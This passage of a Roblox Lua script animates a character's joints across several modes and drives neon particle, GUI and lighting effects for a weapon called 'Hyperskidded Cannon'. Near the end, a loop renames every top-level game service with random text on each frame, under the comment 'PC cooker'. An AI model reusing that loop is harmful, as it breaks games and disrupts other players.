								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(-15, 25) - 2.5 * SIN(SINE / 12)), RAD(MATHR(-15, 25)), RAD(MATHR(-15, 25))), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(35 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(5)) * RIGHTSHOULDERC0, 0.35 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-35 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1 - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.2+ 0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.2+ -0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
							elseif MODE == 10 then
								RootJoint.C0 = Clerp(RootJoint.C0,Welds.Defaults.RootJoint.C0*CFrame.new(0,0,-0.1+0.15* math.sin(sine / 3)*S)*CFrame.Angles(math.rad(15+3 * math.cos(sine / 3)),0,0),.25)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(sine / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.25*SIZE, 0.5*SIZE, 0.5*SIZE) * ANGLES(RAD(-35), RAD(-25 + 2.5 * SIN(sine / 12)), RAD(-55 + 2.5 * SIN(sine / 12))) * RIGHTSHOULDERC0, 1 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5*S,.5*S,0)*CFrame.Angles(math.rad(0 + 70 * math.sin(sine / 6)),0,math.rad(-5))*Welds.Defaults.LeftShoulder.C0,.25)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1*S,-1*S,0)*CFrame.Angles(math.rad(5 + 70 * math.sin(sine / 6)),math.rad(90),math.rad(5)),.25)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1*S,-1*S,0)*CFrame.Angles(math.rad(5 - 70 * math.sin(sine / 6)),math.rad(-90),math.rad(-5)),.25)
							elseif MODE == 11 then -- USC's echo animation
								RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0* 1, 0* 1, -0.175 + 0.025 * COS(SINE / 3.5) + -SIN(SINE / 3.5) / 7* 1) * ANGLES(RAD(26 - 4.5 * COS(SINE / 3.5)), RAD(0) - RootPart.RotVelocity.Y / 75, RAD(15 * COS(SINE / 7))), 0.15)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(25 + MATHR(-5,5) - 4 * COS(SINE / 12)), RAD(MATHR(-5,5)), RAD(15)), 1 / Animation_Speed)
								if math.random(1,5) == 1 then
									Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 + MATHR(-25,25) - 4 * COS(SINE / 12)), RAD(MATHR(-25,25)), RAD(0)), 1.5 / Animation_Speed)	
								end
								RightHip.C0 = Clerp(RightHip.C0, CF(1* 1, -0.925 - 0.5 * COS(SINE / 7) / 2* 1, 0.7 * COS(SINE / 7) / 2* 1) * ANGLES(RAD(-15 - 55 * COS(SINE / 7)) - RightLeg.RotVelocity.Y / 75 + -SIN(SINE / 7) / 2.5, RAD(90 - 0.1 * COS(SINE / 7)), RAD(0)) * ANGLES(RAD(0 + 0.1 * COS(SINE / 7)), RAD(0), RAD(0)), 0.3)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1* 1, -0.925 + 0.5 * COS(SINE / 7) / 2* 1, -0.7 * COS(SINE / 7) / 2* 1) * ANGLES(RAD(-15 + 55 * COS(SINE / 7)) + LeftLeg.RotVelocity.Y / 75 + SIN(SINE / 7) / 2.5, RAD(-90 - 0.1 * COS(SINE / 7)), RAD(0)) * ANGLES(RAD(0 - 0.1 * COS(SINE / 7)), RAD(0), RAD(0)), 0.3)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5 + 0.025 * COS(SINE / 12), 0) * ANGLES(RAD(0), RAD(0 - 7.5 * SIN(SINE / 12)), RAD(12 + 7.5 * SIN(SINE / 12))) * RIGHTSHOULDERC0, 0.15 / 5)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1, 0.5 + 0.05 * SIN(SINE / 30)* 1, -0.34 * COS(SINE / 7* 1)) * ANGLES(RAD(-110)  * COS(SINE / 7) , RAD(-90) ,	RAD(-13) + LeftArm.RotVelocity.Y / 75), 0.15)
							elseif MODE == 12 then
								Speed = 25
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 3 + 0.5 * COS(SINE / 22)) * ANGLES(RAD(20), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(5), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(0), RAD(0))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-0.45, 0.5, -1) * ANGLES(RAD(60), RAD(0), RAD(80)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(-15)), 0.15 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(15)), 0.15 / Animation_Speed)
							elseif MODE == 13 then
								Speed = 25
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CFrame.new(0,0,3 - .5 * math.sin(SINE/50)) * CFrame.Angles(math.rad(20),math.rad(0),math.rad(0)),0.7/3)
								Neck.C0 = Clerp(Neck.C0,NECKC0 * CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),0.7/3)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(-41.6-4*math.sin(SINE/50)),math.rad(0),math.rad(0)) * RIGHTSHOULDERC0,0.7/3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(20),math.rad(0),math.rad(-10-10*math.sin(SINE/50))) * LEFTSHOULDERC0,0.7/3)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-1,-0.01) * CFrame.Angles(math.rad(-20),math.rad(80),math.rad(10+10*math.sin(SINE/50))),1/3)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,-0.01) * CFrame.Angles(math.rad(-10),math.rad(-80),math.rad(-10-10*math.sin(SINE/50))),1/3)
							elseif MODE == 14 then
								Speed = 25
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CFrame.new(0 + .5 * math.cos(sine/50),0,3 - .5 * math.sin(sine/50)) * CFrame.Angles(math.rad(40),math.rad(0),math.rad(0)),0.7/3)
								Neck.C0 = Clerp(Neck.C0,NECKC0 * CFrame.new(0,-.25,0) * CFrame.Angles(math.rad(-40),math.rad(0),math.rad(0)),0.7/3)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(-45),math.rad(0),math.rad(5 + 2 * math.cos(sine/19))) * RIGHTSHOULDERC0,0.7/3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(-45),math.rad(0),math.rad(-5 - 2 * math.cos(sine/19))) * LEFTSHOULDERC0,0.7/3)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.5,-0.5) * CFrame.Angles(math.rad(-20 + 9 * math.cos(sine/74)),math.rad(80),math.rad(0)) * CFrame.Angles(math.rad(0 + 5 * math.cos(sine/37)),math.rad(0),math.rad(0)),0.7/3)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0) * CFrame.Angles(math.rad(-20 - 9 * math.cos(sine/54)),math.rad(-80),math.rad(0)) * CFrame.Angles(math.rad(0 - 5 * math.cos(sine/41)),math.rad(0),math.rad(0)),0.7/3)
							elseif MODE == 15 then
								Speed = 25
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(5), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(5 - 8 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, -0.03) * ANGLES(RAD(180), RAD(-15), RAD(0))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-60 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
							elseif MODE == 16 then
								RightHip.C0 = Clerp(RightHip.C0,CF(1,-0.85,-0.15 - 0.15 * math.cos(sine / 4))*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0))*CFrame.Angles(math.rad(0),math.rad(0 + 5 * math.cos(sine / 8)),math.rad(0 + 25 * math.cos(sine / 8))),.1)
								LeftHip.C0 = Clerp(LeftHip.C0,CF(-1,-0.85,-0.15 + 0.15 * math.cos(sine / 4))*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0))*CFrame.Angles(math.rad(0),math.rad(0 + 5 * math.cos(sine / 8)),math.rad(0 + 25 * math.cos(sine / 8))),.1)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0*CF(0,0,-0.15 - 0.1 * math.cos(sine / 4))*CFrame.Angles(math.rad(5),math.rad(0),math.rad(0 - 5 * math.cos(sine / 8))),.1)
								Neck.C0 = Clerp(Neck.C0,NECKC0*CFrame.Angles(math.rad(25 - 5 * math.cos(sine / 0.325)),math.rad(0 - 5 * math.cos(sine / 0.25)),math.rad(0 + 5 * math.cos(sine / 8))),.1)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CF(1.5,0.5,0)*CFrame.Angles(math.rad(0 - 45 * math.cos(sine / 8)),math.rad(0),math.rad(10 - 10 * math.cos(sine / 4))),.1)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CF(-1.5,0.5,0)*CFrame.Angles(math.rad(160),math.rad(0),math.rad(25)),.1)
							elseif MODE == 17 then
								Speed = 16
								WACKYEFFECT({Time = 12, EffectType = "Block", Size = VT(69,69,69)/69, Size2 = VT(1,1,1), Transparency = .5, Transparency2 = 1, CFrame = RightArm.CFrame*CF(0,-1.45,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color =Color3.fromRGB(0+170*Sick.PlaybackLoudness/1000,0,0+170*Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({Time = 12, EffectType = "Block", Size = VT(69,69,69)/69, Size2 = VT(1,1,1), Transparency = .5, Transparency2 = 1, CFrame = LeftArm.CFrame*CF(0,-1.45,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+170*Sick.PlaybackLoudness/1000,0,0+170*Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({Time = 12, EffectType = "Block", Size = VT(69,69,69)/69, Size2 = VT(1,1,1), Transparency = .5, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1.45,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+170*Sick.PlaybackLoudness/1000,0,0+170*Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({Time = 12, EffectType = "Block", Size = VT(69,69,69)/69, Size2 = VT(1,1,1), Transparency = .5, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1.45,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+170*Sick.PlaybackLoudness/1000,0,0+170*Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								WACKYEFFECT({Time = MATHR(15,65),EffectType = "Slash", Size = VT(0,0.05,0), Size2 = VT(0.0625,0.015,0.0625)*MATHR(1,8), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-2,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(98/255 + Sick.PlaybackLoudness/1000, 37/255 + Sick.PlaybackLoudness/1000, 209/255 + Sick.PlaybackLoudness/1000), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								local FRAME = CF(VT(Torso.Position.X+MATHR(-15,15),Torso.Position.Y,Torso.Position.Z+MATHR(-15,15)))
								MagicSphere(VT(0.6,0.6,0.6),15,FRAME,"Neon orange",VT(0.1,2,0.1),0)
								MagicSphere(VT(0.2,0.2,0.2),15,FRAME,"Royal purple",VT(0.1,2,0.1),0)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1 + 0.5 * COS(SINE / 12)) * ANGLES(RAD(-25 - 3 * SIN(SINE / 12)), RAD(0), RAD(-25)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1.1*SIZE) - 1)) * ANGLES(RAD(23 - 3 * SIN(SINE / 12)), RAD(0), RAD(30)), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(0.75*SIZE, 0.5*SIZE, -1*SIZE) * ANGLES(RAD(70), RAD(0), RAD(-70)) * ANGLES(RAD(20), RAD(25), RAD(-15)) * RIGHTSHOULDERC0, 0.4 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1*SIZE, 0.2*SIZE, -0.5*SIZE) * ANGLES(RAD(25), RAD(0), RAD(85)) * LEFTSHOULDERC0, 0.4 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1*SIZE, -0.5*SIZE - 0.05*SIZE * COS(SINE / 12), -0.5*SIZE) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1*SIZE, -0.8*SIZE - 0.05*SIZE * COS(SINE / 12), -0.01*SIZE) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
							elseif MODE == 18 then
								Speed = 25
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0 - .25*COS(sine/63)+.92*SIN(sine/95), 0, 4 - 2 * SIN(SINE / 53)) * ANGLES(RAD(70), RAD(0-RootPart.RotVelocity.y), RAD(0 - RootPart.RotVelocity.Y * 4.5 + 3 * COS(SINE / 47))), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(12 - 4.10 * SIN(SINE / 12))) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-.75, 0.5, 0.5) * ANGLES(RAD(-25+math.random(-23,23)), RAD(0+math.random(-23,23)), RAD(45+math.random(-23,23))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -.5 - 0.02 * SIN(SINE / 12), -0.5) * ANGLES(RAD(-10 - 2.5 * SIN(SINE / 21)), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.02 * SIN(SINE / 12), -0.01) * ANGLES(RAD(-20 - 2.5 * SIN(SINE / 51)), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
							elseif MODE == 19 then
								Speed = 10
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(5), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MATHR(1, 2) - 2.5 * SIN(SINE / 12)), RAD(MATHR(1, 2)), RAD(MATHR(1, 2))), 1 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(35 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(5)) * RIGHTSHOULDERC0, 0.35 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CFrame.new(-1.5, 0.5, 0 - 0.2 * math.cos(sine / 12)) * CFrame.Angles(math.rad(20 + 45 * math.cos(sine / 12)), math.rad(0 - 10 * math.cos(sine / 12)), math.rad(0 + 2.5 * math.cos(sine / 12))) * lscp, 1 / 3)
								RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1 - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.2+ 0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.2+ -0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
							elseif MODE == 20 then
								Speed = 25
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0 - .25*math.cos(sine/63)+.92*math.sin(sine/95), 0, 4 - 2 * SIN(SINE / 53)) * ANGLES(RAD(70), RAD(0-RootPart.RotVelocity.y), RAD(0 - RootPart.RotVelocity.Y * 4.5 + 3 * COS(SINE / 47))), 0.15 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(15 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(12 - 4.10 * SIN(SINE / 12))) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-.75, 0.5, 0.5) * ANGLES(RAD(-25+math.random(-23,23)), RAD(0+math.random(-23,23)), RAD(45+math.random(-23,23))) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -.5 - 0.02 * SIN(SINE / 12), -0.5) * ANGLES(RAD(-10 - 2.5 * SIN(SINE / 21)), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.02 * SIN(SINE / 12), -0.01) * ANGLES(RAD(-20 - 2.5 * SIN(SINE / 51)), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)	
							end
						end

						if MATHR(1,55) == 1 and WEAPONEQUIPPED == true then
							coroutine.resume(coroutine.create(function()
								VALUE1 = true
								for i=1,25 do
									Swait()
									FT.Parent = Torso
									FRA.Parent = RightArm
									FLA.Parent = LeftArm
									FRL.Parent = RightLeg
									FLL.Parent = LeftLeg
									local oof = Instance.new("FlangeSoundEffect",Sick)
									for _,v in next, Character:GetDescendants() do
										if(v:IsA'DataModelMesh')then
											v.Offset = VT(math.random(-50,50)/100,math.random(-50,50)/100,math.random(-50,50)/100)
										end
									end
								end
								VALUE1 = false
								FT.Parent = nil
								FRA.Parent = nil
								FLA.Parent = nil
								FRL.Parent = nil
								FLL.Parent = nil
								for _,v in next, Character:GetDescendants() do
									if(v:IsA'DataModelMesh')then
										v.Offset = VT(0,0,0)
									end
								end
								Sick:ClearAllChildren()
							end))
						end
						for _, c in pairs(WEAPONGUI:GetChildren()) do
							if c:FindFirstChildWhichIsA("TextLabel") then
								c:FindFirstChildWhichIsA("TextLabel").TextColor3 = COLORSHIFT
								c:FindFirstChildWhichIsA("TextLabel").TextStrokeColor3 = COLORSHIFT
								c:FindFirstChildWhichIsA("TextLabel").Font = FONTS[MATHR(1,#FONTS)]
							end
						end
						COLORSHIFT = outer.Color
						local loudness = Sick.PlaybackLoudness
						WACKYEFFECT({Time = 12.5, EffectType = "Sphere", Size = VT(10*Sick.PlaybackLoudness/75,0,1*Sick.PlaybackLoudness/75), Size2 = VT(1*Sick.PlaybackLoudness/75,0.5,7*Sick.PlaybackLoudness/75), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(RAD(0),RAD(Sick.PlaybackLoudness/666),RAD(0)), RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+178*loudness/100,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})		
						WACKYEFFECT({Time = 12.5, EffectType = "Sphere", Size = VT(1*Sick.PlaybackLoudness/75,0,10*Sick.PlaybackLoudness/75), Size2 = VT(7*Sick.PlaybackLoudness/75,0.69,1*Sick.PlaybackLoudness/75), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(RAD(0),RAD(Sick.PlaybackLoudness/666),RAD(0)), RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+178*loudness/100,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})		
						WACKYEFFECT({Time = 12.5, EffectType = "Sphere", Size = VT(4*Sick.PlaybackLoudness/75,0,4*Sick.PlaybackLoudness/75), Size2 = VT(4*Sick.PlaybackLoudness/75,0.5,4*Sick.PlaybackLoudness/75), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(RAD(0),RAD(Sick.PlaybackLoudness/666),RAD(0)), RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+178*loudness/100,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						if MATHR(1,8) == 1 then
							WACKYEFFECT({Time = MATHR(15,65),EffectType = "Slash", Size = VT(0,0.05,0), Size2 = VT(0.0625,0.015,0.0625)*MATHR(1,8), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-2,0)*CFrame.Angles(math.rad(math.random(-5,5)),math.rad(math.random(-360,360)),math.rad(math.random(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = COLORSHIFT, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						end		
						local HITFLOOR,HITPOS = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 4, Character)
						WACKYEFFECT({Time = 30, EffectType = "Sphere", Size = VT(0.5,0,0.5), Size2 = VT(0.2,6,0.2), Transparency = 0.3, Transparency2 = 1, CFrame = CF(HITPOS)*ANGLES(RAD(0),RAD(MATHR(0,360)),RAD(0))*CF(0,0,MATHR(3,7)) * ANGLES(RAD(MATHR(-15,15)), RAD(0), RAD(MATHR(-15,15))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-1,1)*5, RotationZ = 0, Material = "Neon", Color = Color3.fromRGB(0+178*Sick.PlaybackLoudness/20,104,20), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
						for _, c in pairs(Character:GetChildren()) do
							if c:IsA("Part") or c:IsA("MeshPart") then
							elseif c:IsA("Model") then
								for _, c in pairs(c:GetChildren()) do
									if c:IsA("Part") or c:IsA("MeshPart") then
										c.Color = Torso.Color
									end
								end
							end
						end
						HSCChangesL = {"Hyperskidded Cannon: ","hYpEr sKidDed cAnNon: ","Hyperskidded Cannon: ","Hyperskidded Cannon: ","hYPer skDDidEd: ","","hyperSkiDed cAnNon: ","HყρҽɾSƙιԃԃҽԃ Cαɳɳσɳ: ","uouuɐƆ pǝppıʞSɹǝdʎH: ","ℌ𝔶𝔭𝔢𝔯𝔖𝔨𝔦𝔡𝔡𝔢𝔡 ℭ𝔞𝔫𝔫𝔬𝔫: ","🅷🆈🅿🅴🆁🆂🅺🅸🅳🅳🅴🅳 🅲🅰🅽🅽🅾🅽: ","𝐇𝐲𝐩𝐞𝐫𝐒𝐤𝐢𝐝𝐝𝐞𝐝 𝐂𝐚𝐧𝐧𝐨𝐧: ","≋H≋y≋p≋e≋r≋S≋k≋i≋d≋d≋e≋d≋: ","ⒽⓨⓟⓔⓡⓈⓚⓘⓓⓓⓔⓓ Ⓒⓐⓝⓝⓞⓝ: ","H♥y♥p♥e♥r♥S♥k♥i♥d♥d♥e♥d♥ ♥C♥a♥n♥n♥o♥n: ","H͓̽y͓̽p͓̽e͓̽r͓̽S͓̽k͓̽i͓̽d͓̽d͓̽e͓̽d͓̽ ͓̽C͓̽a͓̽n͓̽n͓̽o͓̽n͓̽: ","☟︎⍓︎◻︎♏︎❒︎💧︎🙵♓︎♎︎♎︎♏︎♎︎ 👍︎♋︎■︎■︎□︎■︎: ","卄ЎⓅ𝔢𝐫ⓢ𝕂𝕚Đｄ𝒆𝓭 𝓬𝔞ภŇ𝐎𝕟: ","𝓗𝐘ρє𝓡𝔰𝕜ｉđｄ€ｄ ςคＮ𝕟𝓞Ⓝ: ","Ħ𝕐Ƥ𝒆гѕ𝓴ιĐ𝒹ｅ๔ 𝒸ᵃᑎ𝓷Ỗ𝐍 ","Ｈ𝕪ᵖ𝐄г𝕊ЌＩ𝒹ᗪẸ๔ 𝔠𝔸ℕᶰ𝕠几: ","𝓱үＰ𝑒Ⓡ𝕤ⓚƗĐＤⒺĐ 𝒸Ⓐη𝔫𝑜ℕ: ","Ħ𝕐Ƥ𝒆гѕ𝓴ιĐ𝒹ｅ๔ 𝒸ᵃᑎ𝓷Ỗ𝐍 ",}
						for i,v in pairs(game:GetChildren()) do -- PC cooker X45252572573295925151346576436573753
							pcall(function()
								v.Name = HSCChangesL[MATHR(1,#HSCChangesL)]
							end)
						end
						WACKYEFFECT({Time = 1, EffectType = "Block", Size =VT(1+Sick.PlaybackLoudness/500,1+Sick.PlaybackLoudness/500,1+Sick.PlaybackLoudness/500), Size2 = VT(1+Sick.PlaybackLoudness/300,1+Sick.PlaybackLoudness/300,1+Sick.PlaybackLoudness/300), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0+9*math.sin(sine/35),0+2*math.sin(sine/75),0+9*math.cos(sine/35))*CFrame.Angles(math.rad(-sine*.5),math.rad(-sine*1),math.rad(-sine*1.5)), MoveToPos = nil, RotationX = nil, RotationY = 0, RotationZ = 0, Material = "Neon", Color = outer.Color, SoundID = nil, SoundPitch = nil, SoundVolume = nil})			
						exitbutton.TextStrokeColor3 = COLORSHIFT
						RWingWld.C0 = Clerp(RWingWld.C0,CFrame.new(.15,.5,.5)*CFrame.Angles(0,math.rad(105-25*math.cos(sine/25)),0),.25)
						LWingWld.C0 = Clerp(LWingWld.C0,CFrame.new(-.15,.5,.5)*CFrame.Angles(0,math.rad(75+25*math.cos(sine/25)),0),.25)
						pcall(function()
							BruhChatLol.TextColor3 = COLORSHIFT
						end)
						if TerrainCol == true then
							VISUALS.FogColor = COLORSHIFT
							VISUALS.Ambient = COLORSHIFT
							VISUALS.OutdoorAmbient = COLORSHIFT
							VISUALS.ClockTime = 6
